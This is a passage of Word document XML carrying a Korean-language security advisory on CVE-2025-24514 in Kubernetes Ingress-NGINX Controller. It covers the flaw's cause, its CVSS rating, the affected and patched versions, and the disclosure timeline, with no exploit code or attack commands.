          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> CVSS </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>등급</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640F81B6" w14:textId="77777777" w:rsidR="00C97778" w:rsidRPr="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>CVE-2025-24514</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>는</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Kubernetes</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ingress-NGINX Controller</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>에서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발견된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치명적인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보안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취약점으로</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, Improper Input Validation(CWE-20) </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>문제에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기인합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이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취약점은</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ingress </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>리소스의</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> auth-url annotation</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>을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통해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악의적인</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> NGINX </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>설정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주입이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가능하도록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하며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공격자는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이를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악용해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컨트롤러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내에서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임의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코드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실행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및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클러스터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내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모든</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Secrets</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>에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접근할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수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있습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E9315C9" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">CVSS v3.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>기준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본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취약점의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점수는</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 8.8(High)</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>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평가되었으며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기밀성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무결성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가용성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모두에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심각한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영향을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미칠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수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있습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC666A1" w14:textId="5BDCF821" w:rsidR="00F630FB" w:rsidRPr="00F630FB" w:rsidRDefault="00F630FB" w:rsidP="00F630FB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F630FB">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">2.2. </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>영향받는</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>버전</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>환경</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="568E78CF" w14:textId="77777777" w:rsidR="00C97778" w:rsidRPr="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>CVE-2025-24514는 Ingress-NGINX Controller의 다음 버전에 영향을 미칩니다:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BD826E" w14:textId="77777777" w:rsidR="00C97778" w:rsidRPr="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="68"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>v1.11.4 이하 모든 버전</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B4178A6" w14:textId="77777777" w:rsidR="00C97778" w:rsidRPr="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="68"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>v1.12.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09BE451C" w14:textId="71C023C3" w:rsidR="00C97778" w:rsidRPr="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>패치가 적용된 안전한 버전은 v1.11.5 및 v1.12.1입니다.</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>이 취약점은 Azure Kubernetes Service(AKS) 등 주요 클라우드 환경을 포함해, Ingress-NGINX Controller를 사용하는 모든 Kubernetes 배포 환경에 영향을 미칩니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735B0979" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00F630FB" w:rsidP="00F630FB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F630FB">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">2.3. </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공개</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>패치</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>일정</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01820EF8" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="69"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>2024년 12월 31일:</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t> Wiz Research가 Kubernetes 프로젝트에 CVE-2025-24514(및 CVE-2025-1974 등) 최초 보</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>고</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB608D1" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="69"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>2025년 2월 7일:</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t> Kubernetes 프로젝트에서 내부 패치 배포</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="449AC2B6" w14:textId="065ED24A" w:rsidR="00C97778" w:rsidRPr="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="69"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>2025년 3월 24일:</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t> 취약점 및 패치 공식 공개, 관련 보안 권고문 발표</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C8052CE" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공개와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동시에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패치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버전</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>(v1.11.5, v1.12.1)</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이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릴리스되어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사용자들에게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즉각적인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업그레이드가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권고되었습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F2BD02" w14:textId="615888AE" w:rsidR="00F630FB" w:rsidRPr="00F630FB" w:rsidRDefault="00F630FB" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F630FB">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">2.4. </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>관련</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">(CVE-2025-1974 </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>등</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>과의</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>관계</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5F1EEA" w14:textId="77777777" w:rsidR="00C97778" w:rsidRPr="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
